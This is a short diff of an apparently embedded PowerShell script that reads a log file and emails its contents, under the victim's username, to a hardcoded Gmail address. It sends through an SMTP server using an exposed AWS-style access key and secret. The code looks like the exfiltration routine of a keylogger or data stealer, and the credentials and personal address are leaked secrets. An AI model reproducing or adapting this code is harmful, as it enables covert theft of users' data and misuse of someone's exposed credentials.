@@ -12,7 +12,7 @@ $email='lukeosullivan123@gmail.com';
 $smtpUser='AKIAU2UDJAPS6AGCQU55';
 $smtpPass='BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi';
 $logs = Get-Content '$logFile' -Raw;
-$subject=`"$($env:UserName) Logs`";
+$subject = `$env:UserName + ' Logs';
 $msg=New-Object System.Net.Mail.MailMessage;
 $msg.From=$email;
 $msg.To.Add($email);
@@ -25,6 +25,7 @@ $smtp.DeliveryMethod=[System.Net.Mail.SmtpDeliveryMethod]::Network;
 $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass);
 $smtp.Send($msg)
 "
+
 
 
 
